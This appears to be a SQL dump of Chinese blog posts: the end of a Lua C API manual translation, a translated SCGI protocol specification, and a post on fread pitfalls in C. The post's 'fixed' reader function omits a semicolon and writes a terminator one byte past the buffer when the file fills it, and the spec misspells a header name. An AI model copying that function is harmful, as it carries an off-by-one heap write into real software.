之见的信息交换。所有 API 函数和关联的类型、常量都被声明在头文件 lua.h 里。\n即使我们使用了“函数”这个术语，许多 API 中的接口仍然以宏的方式提供。所有这样的宏只会精确地将每个参数使用一次（除了第一个参数，第一个参数始终为 Lua State），并且不会产生任何隐藏的副作用。\n几乎在所有的 C 语言库中，Lua API 函数都不会检查它们收到参数的有效性和一致性。然而，你可以通过修改 luaconf.h 中的宏定义 luai_apicheck 来改变这个行为。\n\n\n状态栈\n译者注：本文中，带有双引号的“栈”特别指代 Lua State 状态栈。\nLua 使用一个虚拟的“栈”来和 C 语言之间传值和取值。每个栈中的元素都表示一个 Lua 值（nil 空值、number 数值型、string 字符串，诸如此类）。\n无论何时，Lua 调用 C 语言时，被调用函数会获得一个新的“栈”，它和前一个“栈”以及 C 语言函数的活动栈相互独立。这个“栈”初始化的时候包含了任何传入 C 语言函数的参数，同时 C 语言函数也在这个“栈”上推入值作为调用者的返回值。详见 lua_CFunction API 的文档。\n为了方便，大多数 API 中的查询操作都不会遵循严格的栈访问规则（指严格的先进后出顺序访问，译者注）。相反，调用者可以通过索引引用“栈”上任何位置的元素：一个正数的索引代表“栈”上的绝对位置（从 1 开始）；一个负数的索引代表相对“栈”顶的位移位置。更明确来说，如果一个“栈”有 n 个元素，那么索引 1 代表“栈”上的第一个元素（也即第一个被推入栈中的元素）（即栈底，译者注），索引 -1 却代表最后一个元素（也即栈顶元素），索引 -n 代表第一个元素（即栈底，译者注）。如果一个所有的值在 1 到栈顶之间（也即 1 ≤ abs(index) ≤ top ），我们就说这个索引是有效的。\n\n\n状态栈大小\n当你和 Lua API 交互时，你作为开发者有责任自己对一致性问题提供保证。往细里说，你有责任控制“栈”不要溢出。你可以使用 C 语言函数 lua_checkstack 来检视“栈”的大小。\n无论何时 Lua 调用 C 语言，都能确保“栈”中有 LUA_MINSTACK （API 中的宏定义，译者注）个位置可供使用。 LUA_MINSTACK 的定义是 20，所以一般情况下你不需要担心“栈”的大小不够你的代码循环推入元素。\n大多数查询函数接受去获取有效“栈”空间中的任何值，也即通过 lua_checkstack 检查“栈”的最大大小。这样的索引被称为“可接受索引”。更具有普遍适用意义地，我们给可接受索引一个定义，如下：\n(index < 0 && abs(index) <= top) ||\n(index > 0 && index <= stackspace)\n\n注意， 0 在任何时候都不是一个可接受索引。\n\n\n伪索引\n无需额外注意，所有函数都接受被称为“伪索引”的值作为有效的索引。伪索引表示一些可被 C 语言中 Lua API 函数接受，但却不在“栈”中的 Lua 值。伪索引常常被用来访问线程的环境、函数的环境、注册表以及 C 语言函数中的“上值”（upvalue，函数式编程中指闭包函数引用了的外部作用域变量，译者注）（参考 3.4 节）。\n线程环境（全局变量存活的地方）始终位于伪索引 LUA_GLOBALSINDEX ，正在运行的 C 语言函数始终位于伪索引 LUA_ENVIRONINDEX 。\n如果需要访问和修改全局变量的值，你需要对环境“表”（Lua 中一种类似关联数组的数据结构，译者注）使用常规的表操作。举个例子，访问全局变量，只需要：\nlua_getfield(L, LUA_GLOBALSINDEX, varname);\n\n\n\nC 语言闭包\n当一个 C 语言函数被创建出来，就有可能将它和某些值关联起来，从而创建了一个 C 语言的闭包（并非编译原理或离散数学中的闭包，这里特指函数式编程的“词法闭包”，译者注）；这些值被称之为“上值”（upvalues），无论绑定的函数在何时被调用，它们都能保证是可访问的。参考 lua_pushcclosure 函数 API 文档。\n无论何时，一个 C 语言函数被调用，它的上值都位于一个特殊的伪索引上。这个伪索引由 lua_upvalueindex 宏提供。第一个关联到函数的值位于 lua_upvalueindex(1) 位置，依此类推。任何对 lua_upvalueindex(n) 的访问，n 总是大于当前函数中上值的数量（但不会大于 256），提供一个可被接受（但无效）的特殊索引。\n\n\n注册表\nLua 提供了一个注册表，一个预定义的表，可以被任何 C 语言代码使用，以便于储存人呢和需要储存的 Lua 值。这个表始终位于伪索引 LUA_REGISTRYINDEX 之上。任何 C 语言库都能将数据存储到这个表中，但存储者应该要小心地选择键名，以和其他库所使用的不同，避免冲突。典型来说，你应该选择一个包含库名的字符串，或者一个内存地址位于你自己的库中的 C 对象所封装的“用户数据”（Lua 对 C 语言指针的一种封装，译者注），来作为你的键名。\n注册表中，整型的键名被引用机制所使用，这是 auxiliary 库（Lua API 的一套上层封装工具集，译者注）所实现的。所以不应该将整型键名用作其他用途。\n\n\nC 语言方面的错误处理\n在内部，Lua 使用 C 语言的 longjmp 机制来处理错误。（如果你使用 C++，你也可以使用 C++ 异常，详见 luaconf.h ） 当 Lua 面对任何错误（例如内存分配错误、类型错误、语法错误以及运行时错误）它会将其抛出——也就是做一次跳出（long jump）。在保护环境中，Lua 使用 setjmp 来设置一个恢复指针；从任何错误中都会跳出到最近激活的恢复指针。\n大多数 API 函数都能抛出一个错误，例如遇到了内存分配失败。本文档为每一个函数明确声明了可能抛出的错误。\n在 C 语言函数中，你可以调用 lua_error 来抛出一个错误。\n', NULL, NULL, NULL);
INSERT INTO `post` (`id`, `url`, `title`, `content`, `created_at`, `blog_id`, `updated_at`, `published_at`, `hide`, `keywords`, `clicks`, `recommend`, `pure_content`, `need_analysis`, `published_at_exceed`, `updated_at_exceed`) VALUES
(53, 'https://blog.tonyseek.com/post/scgi-protocol-specification/', '[翻译] SCGI 协议规格说明书', '<p><img alt="知识共享署名-非商业性使用-相同方式共享 3.0 许可协议" src="https://i.creativecommons.org/l/by-nc-sa/3.0/88x31.png" /></p>\n<ul class="simple">\n<li>原文：Neil Schemenauer &lt;nas at python dot ca&gt; 2008-06-23</li>\n<li>翻译：TonySeek &lt;tonyseek at gmail dot com&gt; 2013-03-17</li>\n</ul>\n<p>原文地址： <a class="reference external" href="http://python.ca/scgi/protocol.txt">http://python.ca/scgi/protocol.txt</a></p>\n\n<div class="section" id="id1">\n<h2>简介</h2>\n<p>SCGI 协议是通用网关协议（CGI）的替代协议，它描述了一套应用程序和 HTTP 服务器之间的接口标准。它和 FastCGI 协议非常类似，但设计得更加简单和易于实现。</p>\n<p>在本文档中，一个 8 位字节串可能被写成两种形式：</p>\n<ul class="simple">\n<li>以一系列十六进制数字的形式，写在尖括号中；</li>\n<li>以一系列 ASCII 字符的形式，写在双引号中。</li>\n</ul>\n<p>例如，&lt;68 65 6c 6c 6f 20 77 6f 72 6c 64 21&gt; 是一个长度为 12 的字符串，它和字符串 &quot;hello world!&quot; 是等价的。注意，这仅仅是本文档的一种约定，并不是协议规格的一部分。</p>\n</div>\n<div class="section" id="id2">\n<h2>协议</h2>\n<p>客户端通过一个可靠的流协议连接到 SCGI 服务器，这个流协议允许传输 8 位字节串。客户端的工作由发送一个请求开始。请参考第三部分对请求格式的描述。</p>\n<p>当 SCGI 服务器读取到请求结束，它会向回发送一个响应并关闭本次连接。本规格说明不约定响应的格式。</p>\n</div>\n<div class="section" id="id3">\n<h2>请求的格式</h2>\n<p>一个请求由一系列的请求头和一个请求体构成。请求头的格式如下：</p>\n<pre class="literal-block">\nheaders ::= header*\nheader ::= name NUL value NUL\nname ::= notnull+\nvalue ::= notnull*\nnotnull ::= &lt;01&gt; | &lt;02&gt; | &lt;03&gt; | ... | &lt;ff&gt;\nNUL = &lt;00&gt;\n</pre>\n<p>请求头中不允许出现同样的项名。第一个请求头的项名必须为 <tt class="docutils literal">CONENTE_LENGTH</tt> ，值为一个非空的 ASCII 字符串，包含了请求体长度的字符串形式数字。</p>\n<p>请求头项 <tt class="docutils literal">CONTENT_LENGTH</tt> 必须始终被提供，即使它的值是 <tt class="docutils literal">&quot;0&quot;</tt> 。</p>\n<p>除此之外，另一个必须始终被提供的请求头项名是 <tt class="docutils literal">&quot;SCGI&quot;</tt> ，值是 <tt class="docutils literal">&quot;1&quot;</tt> 。</p>\n<p>为了促进从 CGI 到 SCGI 的过渡，应该将标准 CGI 环境变量作为 SCGI 的请求头项提供。</p>\n<p>请求头在被发送时，会被编码成 netstring。Netstring 编码方式在本文第四部分解释。请求体在被发送时则尾随在请求头后面，请求体的长度由请求头中的 <tt class="docutils literal">&quot;CONTENT_LENGTH&quot;</tt> 规定。</p>\n</div>\n<div class="section" id="netstring">\n<h2>Netstring 编码</h2>\n<p>任何 8 位字节串都可以被编码成 <tt class="docutils literal"><span class="pre">[长度]&quot;:&quot;[内容]&quot;,&quot;</span></tt> 的格式。其中 <tt class="docutils literal">[内容]</tt> 是字节串本身，而 <tt class="docutils literal">[长度]</tt> 是一个非空字节串，以整数的 ASCII 字符串形式记录 <tt class="docutils literal">[内容]</tt> 的长度。这个 ASCII 字符串中，&lt;30&gt; ( <tt class="docutils literal">&quot;0&quot;</tt> )代表整数 0，&lt;31&gt; 代表整数 1，依此类推，直到 &lt;39&gt; 表示整数 9。 <tt class="docutils literal">[长度]</tt> 前面放置多余的 <tt class="docutils literal">&quot;0&quot;</tt> 是不被允许的：如果 <tt class="docutils literal">[内容]</tt> 为空， <tt class="docutils literal">[长度]</tt> 应该以 &lt;30&gt; 打头。</p>\n<p>举例说明，字符串 <tt class="docutils literal">&quot;hello world!&quot;</tt> 的编码是 &lt;31 32 3a 68 65 6c 6c 6f 20 77 6f 72 6c 64 21 2c&gt;，即 <tt class="docutils literal">&quot;12:hello <span class="pre">world!,&quot;</span></tt> ；空的字符串的编码是 <tt class="docutils literal"><span class="pre">&quot;0:,&quot;</span></tt> 。 <tt class="docutils literal"><span class="pre">[长度]&quot;:&quot;[内容]&quot;,&quot;</span></tt> 的格式被称为 netstring，而 <tt class="docutils literal">[内容]</tt> 则是该 netstring 的“解释取值结果”。</p>\n</div>\n<div class="section" id="id4">\n<h2>范例</h2>\n<p>前端 Web 服务器（即 SCGI 客户端）打开一个连接，并发送以下字符串内容到 SCGI 服务器：</p>\n<pre class="literal-block">\n&quot;70:&quot;\n    &quot;CONTENT_LENGTH&quot; &lt;00&gt; &quot;27&quot; &lt;00&gt;\n    &quot;SCGI&quot; &lt;00&gt; &quot;1&quot; &lt;00&gt;\n    &quot;REQUEST_METHOD&quot; &lt;00&gt; &quot;POST&quot; &lt;00&gt;\n    &quot;REQUEST_URI&quot; &lt;00&gt; &quot;/deepthought&quot; &lt;00&gt;\n&quot;,&quot;\n    &quot;What is the answer to life?&quot;\n</pre>\n<p>SCGI 服务器回发了如下响应：</p>\n<pre class="literal-block">\n&quot;Status: 200 OK&quot; &lt;0d 0a&gt;\n&quot;Content-Type: text/plain&quot; &lt;0d 0a&gt;\n&quot;&quot; &lt;0d 0a&gt;\n&quot;42&quot;\n</pre>\n<p>然后 SCGI 服务器关闭该请求&amp;响应的网络连接。</p>\n</div>\n<div class="section" id="id5">\n<h2>版权声明</h2>\n<p>本文档（指原文，译者注）置于公共领域发表。</p>\n<p>本文翻译采用 <a class="reference external" href="https://creativecommons.org/licenses/by-nc-sa/3.0/deed.zh">知识共享署名-非商业性使用-相同方式共享 3.0 许可协议</a> 进行许可。</p>\n</div>', '2014-11-06 23:43:08', 6, '2013-05-28 04:33:00', '2013-05-28 04:33:00', 0, '[["\\u8bf7\\u6c42", 0.3380090264593824], ["SCGI", 0.31235734568147266], ["00", 0.255565101012114], ["\\u5b57\\u7b26\\u4e32", 0.1842215328008551], ["6c", 0.170376734008076], ["\\u957f\\u5ea6", 0.1536307935834442], ["\\u670d\\u52a1\\u5668", 0.1341383555663658], ["\\u534f\\u8bae", 0.12718583007007125], ["\\u5b57\\u8282", 0.12469691532422802], ["\\u683c\\u5f0f", 0.12036137581881237], ["ASCII", 0.11358448933871733], ["LENGTH", 0.11358448933871733], ["6f", 0.11358448933871733], ["\\u7f16\\u7801", 0.10582238794774346], ["\\u53d1\\u9001", 0.09258770094489312], ["\\u5185\\u5bb9", 0.08536813212472684], ["world", 0.085188367004038], ["notnull", 0.085188367004038], ["0d", 0.085188367004038], ["CGI", 0.085188367004038]]', NULL, NULL, '\n\n原文：Neil Schemenauer <nas at python dot ca> 2008-06-23\n翻译：TonySeek <tonyseek at gmail dot com> 2013-03-17\n\n原文地址： http://python.ca/scgi/protocol.txt\n\n\n简介\nSCGI 协议是通用网关协议（CGI）的替代协议，它描述了一套应用程序和 HTTP 服务器之间的接口标准。它和 FastCGI 协议非常类似，但设计得更加简单和易于实现。\n在本文档中，一个 8 位字节串可能被写成两种形式：\n\n以一系列十六进制数字的形式，写在尖括号中；\n以一系列 ASCII 字符的形式，写在双引号中。\n\n例如，<68 65 6c 6c 6f 20 77 6f 72 6c 64 21> 是一个长度为 12 的字符串，它和字符串 "hello world!" 是等价的。注意，这仅仅是本文档的一种约定，并不是协议规格的一部分。\n\n\n协议\n客户端通过一个可靠的流协议连接到 SCGI 服务器，这个流协议允许传输 8 位字节串。客户端的工作由发送一个请求开始。请参考第三部分对请求格式的描述。\n当 SCGI 服务器读取到请求结束，它会向回发送一个响应并关闭本次连接。本规格说明不约定响应的格式。\n\n\n请求的格式\n一个请求由一系列的请求头和一个请求体构成。请求头的格式如下：\n\nheaders ::= header*\nheader ::= name NUL value NUL\nname ::= notnull+\nvalue ::= notnull*\nnotnull ::= <01> | <02> | <03> | ... | <ff>\nNUL = <00>\n\n请求头中不允许出现同样的项名。第一个请求头的项名必须为 CONENTE_LENGTH ，值为一个非空的 ASCII 字符串，包含了请求体长度的字符串形式数字。\n请求头项 CONTENT_LENGTH 必须始终被提供，即使它的值是 "0" 。\n除此之外，另一个必须始终被提供的请求头项名是 "SCGI" ，值是 "1" 。\n为了促进从 CGI 到 SCGI 的过渡，应该将标准 CGI 环境变量作为 SCGI 的请求头项提供。\n请求头在被发送时，会被编码成 netstring。Netstring 编码方式在本文第四部分解释。请求体在被发送时则尾随在请求头后面，请求体的长度由请求头中的 "CONTENT_LENGTH" 规定。\n\n\nNetstring 编码\n任何 8 位字节串都可以被编码成 [长度]":"[内容]"," 的格式。其中 [内容] 是字节串本身，而 [长度] 是一个非空字节串，以整数的 ASCII 字符串形式记录 [内容] 的长度。这个 ASCII 字符串中，<30> ( "0" )代表整数 0，<31> 代表整数 1，依此类推，直到 <39> 表示整数 9。 [长度] 前面放置多余的 "0" 是不被允许的：如果 [内容] 为空， [长度] 应该以 <30> 打头。\n举例说明，字符串 "hello world!" 的编码是 <31 32 3a 68 65 6c 6c 6f 20 77 6f 72 6c 64 21 2c>，即 "12:hello world!," ；空的字符串的编码是 "0:," 。 [长度]":"[内容]"," 的格式被称为 netstring，而 [内容] 则是该 netstring 的“解释取值结果”。\n\n\n范例\n前端 Web 服务器（即 SCGI 客户端）打开一个连接，并发送以下字符串内容到 SCGI 服务器：\n\n"70:"\n    "CONTENT_LENGTH" <00> "27" <00>\n    "SCGI" <00> "1" <00>\n    "REQUEST_METHOD" <00> "POST" <00>\n    "REQUEST_URI" <00> "/deepthought" <00>\n","\n    "What is the answer to life?"\n\nSCGI 服务器回发了如下响应：\n\n"Status: 200 OK" <0d 0a>\n"Content-Type: text/plain" <0d 0a>\n"" <0d 0a>\n"42"\n\n然后 SCGI 服务器关闭该请求&响应的网络连接。\n\n\n版权声明\n本文档（指原文，译者注）置于公共领域发表。\n本文翻译采用 知识共享署名-非商业性使用-相同方式共享 3.0 许可协议 进行许可。\n', NULL, NULL, NULL),
(54, 'https://blog.tonyseek.com/post/the-learning-summary-of-c-programming/', 'C 语言程序设计笔记', '<p>呵呵，看标题像是大一同学的学习笔记，事实上我是一个大四将毕业的人了。我在大一入学之后认认真真学习的第一个程序语言是 C 语言，当然，是在在课堂上。可是快四年来，我用的最多的却是各路动态语言(人生短暂我用 Python)。后来毕业设计需要选题，我跟了一个很有黑客精神的导师 <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id5" id="id1">[0]</a> ，所以也就希望能挑战一下自己，选择了用我并不熟悉的 C 语言来做系统编程&amp;网络编程。</p>\n<p>那个项目 <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id7" id="id2">[1]</a> 总算还花了我不少时间和精力，虽然答辩时遇到了奇葩的人并发生了不愉快的事情，但我终究是学到了不少东西。这篇博客用来记录我掉的那些坑，并让读者看到后可以对我说：“你还是回大一去重学吧”。</p>\n\n<div class="section" id="id3">\n<h2>没承诺的事情它就不会去做</h2>\n<p>用 C 语言读取一个文件，当然可以用 POSIX 系统调用 <tt class="docutils literal">read</tt> 函数。不过如果想兼容其他非 POSIX 平台，比如 Windows，比如某些特定的嵌入式环境，最好的选择还是使用 ANSI C 的 <tt class="docutils literal">stdio.h</tt> 提供的 <tt class="docutils literal">fread</tt> 函数。</p>\n<p>我起初是用了这样一段代码去读取一个文本文件：</p>\n<figure class="code"><figcaption><span>test_data.c</span></figcaption><div class="highlight"><pre> <span class="kt">char</span> <span class="o">*</span> <span class="nf">alloc_read_test_data</span><span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">max_len</span><span class="p">)</span>\n <span class="p">{</span>\n     <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>\n\n     <span class="cm">/* allocate buffer */</span>\n     <span class="n">buffer</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">)</span> <span class="o">*</span> <span class="n">max_len</span><span class="p">);</span>\n     <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">)</span> <span class="o">*</span> <span class="n">max_len</span><span class="p">);</span>\n\n     <span class="cm">/* read test data */</span>\n     <span class="k">if</span> <span class="p">(</span><span class="n">fread</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">),</span> <span class="n">max_len</span><span class="p">,</span> <span class="n">stream</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>\n         <span class="k">return</span> <span class="n">buffer</span><span class="p">;</span>\n\n     <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>\n <span class="p">}</span>\n</pre></div>\n</figure><p>这段代码在 Linux 下完全工作正常，但是在 OSX 下总是会出现“乱入”：</p>\n<figure class="code"><figcaption><span>bash</span></figcaption><div class="highlight"><pre><span class="go"> $ cat test_data.txt</span>\n<span class="go"> What is the answer to life?</span>\n\n<span class="go"> $ ./test_read_data test_data.txt</span>\n<span class="go"> What is the answer to life?</span>\n<span class="go"> he answer to life?</span>\n\n<span class="go"> $ # WTF ↑↑</span>\n</pre></div>\n</figure><p>我不相信这是脏内存导致的，因为为了保险起见我已经用 <tt class="docutils literal">memset</tt> 将新分配的内存块填 0 了。而且非常奇异的是，“乱入”的字符总是正常读取字符的节选。为此我搜索了很多资料都未寻到解答，还以为是 OSX 下 libc 的 Bug。最后翻查文档 <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id8" id="id4">[2]</a> 对 <tt class="docutils literal">fread</tt> 的描述:</p>\n<blockquote>\n<p>Reads an array of count elements, each one with a size of size bytes, from the stream and stores them in the block of memory specified by ptr.</p>\n<p>The position indicator of the stream is advanced by the total amount of bytes read. The total amount of bytes read if successful is <tt class="docutils literal">(size*count)</tt> .</p>\n</blockquote>\n<p>貌似文档只承诺了 <tt class="docutils literal">fread</tt> 会做这么几点：</p>\n<ul class="simple">\n<li>将 n 组指定尺寸的元素从流（ <tt class="docutils literal">FILE *</tt> ）读入，然后存储到第一个参数指针所指向的内存区域</li>\n<li>将流的位置指针向后移动，读了多少移动多少</li>\n<li>读入的总字节数为提供的 <tt class="docutils literal">count</tt> 参数</li>\n</ul>\n<p>然后，关于返回值文档的描述是：</p>\n<blockquote>\nThe total number of elements successfully read is returned. If this number\ndiffers from the count parameter, either a reading error occurred or the\nend-of-file was reached while reading. ...</blockquote>\n<p>好了，再多承诺一点：</p>\n<ul class="simple">\n<li>返回值如果小于 <tt class="docutils literal">count</tt> 参数，则说明发生了读取错误，或者已经到达了文件结尾</li>\n</ul>\n<p>貌似在这些承诺中，有两点没有被提及：</p>\n<ol class="arabic simple">\n<li>将读取到的内容存入指定内存区域后，是否要在结尾补上字符串终结符 <tt class="docutils literal">''\\0''</tt> ？</li>\n<li>如果因为 EOF 或者其他原因，读到的字节数 M 小于指定字节数 COUNT， <tt class="docutils literal">fread</tt> 是否仅仅对大小为 M 的内存区域做出修改呢？</li>\n</ol>\n<p>首先可以确定第一点是否定的， <tt class="docutils literal">fread</tt> 并非仅仅为文本流读取设计，它不会自己去补这个终结符；第二点则是我遇到的奇怪问题所在：文档承诺对传入指针参数指向的内存区域写入，并且预期的写入尺寸由 <tt class="docutils literal">count</tt> 参数指定，而读取到的实际尺寸小于预期尺寸一律视为一种异常情况，包括 EOF 导致的截断。异常情况下文档的约定**并没有承诺**仅仅写入 M 大小的区域，而不污染 (M, COUNT] 的区域。尽管 Linux 下 glibc 做了这件没承诺的事情，但 libc 并没有这个责任。</p>\n<p>所以，如果不考虑 EOF 以外的读取异常，用 <tt class="docutils literal">fread</tt> 读取一个最终读到尺寸可能小于预期尺寸的文件，应该手动补上终结符 <tt class="docutils literal">''\\0''</tt> 以解决余下的区域可能的污染问题。</p>\n<figure class="code"><figcaption><span>test_data.c</span></figcaption><div class="highlight"><pre> <span class="kt">char</span> <span class="o">*</span> <span class="nf">alloc_read_test_data</span><span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">max_len</span><span class="p">)</span>\n <span class="p">{</span>\n     <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>\n     <span class="kt">size_t</span> <span class="n">nread</span><span class="p">;</span>\n\n     <span class="cm">/* allocate buffer */</span>\n     <span class="n">buffer</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">)</span> <span class="o">*</span> <span class="n">max_len</span><span class="p">);</span>\n     <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">)</span> <span class="o">*</span> <span class="n">max_len</span><span class="p">);</span>\n\n     <span class="cm">/* read test data */</span>\n     <span class="n">nread</span> <span class="o">=</span> <span class="n">fread</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">),</span> <span class="n">max_len</span><span class="p">,</span> <span class="n">stream</span><span class="p">)</span>\n     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">nread</span><span class="p">)</span>\n         <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>\n\n     <span class="n">buffer</span><span class="p">[</span><span class="n">nread</span><span class="p">]</span> <span class="o">=</span> <span class="sc">''\\0''</span><span class="p">;</span>  <span class="cm">/* for safe */</span>\n     <span class="k">return</span> <span class="n">buffer</span><span class="p">;</span>\n <span class="p">}</span>\n</pre></div>\n</figure><p>困了想睡觉…… 要不明天接着写吧？</p>\n<table class="docutils footnote" frame="void" id="id5" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id1">[0]</a></td><td><a class="reference external" href="http://rsc.szu.edu.cn/fengcai/list.asp?ProdId=000842">尹剑飞老师，在深大的同学可以考虑选或者旁听他的课</a></td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id7" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id2">[1]</a></td><td><a class="reference external" href="https://github.com/tonyseek/tinyscgi">Yet Another Application Server Based on Lua and SCGI</a></td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id8" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id4">[2]</a></td><td><a class="reference external" href="http://www.cplusplus.com/reference/cstdio/fread/">fread - C++ Reference</a></td></tr>\n</tbody>\n</table>\n</div>', '2014-11-06 23:43:08', 6, '2013-05-18 17:38:00', '2013-05-18 17:38:00', 0, '[["buffer", 0.28779995840314815], ["char", 0.22138458338703704], ["read", 0.19924612504833333], ["fread", 0.19924612504833333], ["test", 0.19924612504833333], ["data", 0.19924612504833333], ["len", 0.17710766670962963], ["max", 0.17710766670962963], ["\\u8bfb\\u53d6", 0.16458876602066666], ["sizeof", 0.13283075003222222], ["size", 0.13283075003222222], ["count", 0.13283075003222222], ["stream", 0.13283075003222222], ["\\u5185\\u5b58", 0.11076502243611111], ["\\u6587\\u6863", 0.09248754302361112], ["return", 0.08855383335481481], ["nread", 0.08855383335481481], ["\\u5c3a\\u5bf8", 0.08424121709144444], ["\\u627f\\u8bfa", 0.08386230710692592], ["\\u533a\\u57df", 0.0744020684702037]]', NULL, NULL, '呵呵，看标题像是大一同学的学习笔记，事实上我是一个大四将毕业的人了。我在大一入学之后认认真真学习的第一个程序语言是 C 语言，当然，是在在课堂上。可是快四年来，我用的最多的却是各路动态语言(人生短暂我用 Python)。后来毕业设计需要选题，我跟了一个很有黑客精神的导师 [0] ，所以也就希望能挑战一下自己，选择了用我并不熟悉的 C 语言来做系统编程&网络编程。\n那个项目 [1] 总算还花了我不少时间和精力，虽然答辩时遇到了奇葩的人并发生了不愉快的事情，但我终究是学到了不少东西。这篇博客用来记录我掉的那些坑，并让读者看到后可以对我说：“你还是回大一去重学吧”。\n\n\n没承诺的事情它就不会去做\n用 C 语言读取一个文件，当然可以用 POSIX 系统调用 read 函数。不过如果想兼容其他非 POSIX 平台，比如 Windows，比如某些特定的嵌入式环境，最好的选择还是使用 ANSI C 的 stdio.h 提供的 fread 函数。\n我起初是用了这样一段代码去读取一个文本文件：\ntest_data.c char * alloc_read_test_data(FILE *stream, size_t max_len)\n {\n     char *buffer;\n\n     /* allocate buffer */\n     buffer = malloc(sizeof(char) * max_len);\n     memset(buffer, 0, sizeof(char) * max_len);\n\n     /* read test data */\n     if (fread(buffer, sizeof(char), max_len, stream) > 0)\n         return buffer;\n\n     return NULL;\n }\n\n这段代码在 Linux 下完全工作正常，但是在 OSX 下总是会出现“乱入”：\nbash $ cat test_data.txt\n What is the answer to life?\n\n $ ./test_read_data test_data.txt\n What is the answer to life?\n he answer to life?\n\n $ # WTF ↑↑\n\n我不相信这是脏内存导致的，因为为了保险起见我已经用 memset 将新分配的内存块填 0 了。而且非常奇异的是，“乱入”的字符总是正常读取字符的节选。为此我搜索了很多资料都未寻到解答，还以为是 OSX 下 libc 的 Bug。最后翻查文档 [2] 对 fread 的描述:\n\nReads an array of count elements, each one with a size of size bytes, from the stream and stores them in the block of memory specified by ptr.\nThe position indicator of the stream is advanced by the total amount of bytes read. The total amount of bytes read if successful is (size*count) .\n\n貌似文档只承诺了 fread 会做这么几点：\n\n将 n 组指定尺寸的元素从流（ FILE * ）读入，然后存储到第一个参数指针所指向的内存区域\n将流的位置指针向后移动，读了多少移动多少\n读入的总字节数为提供的 count 参数\n\n然后，关于返回值文档的描述是：\n\nThe total number of elements successfully read is returned. If this number\ndiffers from the count parameter, either a reading error occurred or the\nend-of-file was reached while reading. ...\n好了，再多承诺一点：\n\n返回值如果小于 count 参数，则说明发生了读取错误，或者已经到达了文件结尾\n\n貌似在这些承诺中，有两点没有被提及：\n\n将读取到的内容存入指定内存区域后，是否要在结尾补上字符串终结符 ''\\0'' ？\n如果因为 EOF 或者其他原因，读到的字节数 M 小于指定字节数 COUNT， fread 是否仅仅对大小为 M 的内存区域做出修改呢？\n\n首先可以确定第一点是否定的， fread 并非仅仅为文本流读取设计，它不会自己去补这个终结符；第二点则是我遇到的奇怪问题所在：文档承诺对传入指针参数指向的内存区域写入，并且预期的写入尺寸由 count 参数指定，而读取到的实际尺寸小于预期尺寸一律视为一种异常情况，包括 EOF 导致的截断。异常情况下文档的约定**并没有承诺**仅仅写入 M 大小的区域，而不污染 (M, COUNT] 的区域。尽管 Linux 下 glibc 做了这件没承诺的事情，但 libc 并没有这个责任。\n所以，如果不考虑 EOF 以外的读取异常，用 fread 读取一个最终读到尺寸可能小于预期尺寸的文件，应该手动补上终结符 ''\\0'' 以解决余下的区域可能的污染问题。\ntest_data.c char * alloc_read_test_data(FILE *stream, size_t max_len)\n {\n     char *buffer;\n     size_t nread;\n\n     /* allocate buffer */\n     buffer = malloc(sizeof(char) * max_len);\n     memset(buffer, 0, sizeof(char) * max_len);\n\n     /* read test data */\n     nread = fread(buffer, sizeof(char), max_len, stream)\n     if (!nread)\n         return NULL;\n\n     buffer[nread] = ''\\0'';  /* for safe */\n     return buffer;\n }\n\n困了想睡觉…… 要不明天接着写吧？\n\n\n\n[0]尹剑飞老师，在深大的同学可以考虑选或者旁听他的课\n\n\n\n\n\n[1]Yet Another Application Server Based on Lua and SCGI\n\n\n\n\n\n[2]fread - C++ Reference\n\n\n', NULL, NULL, NULL),
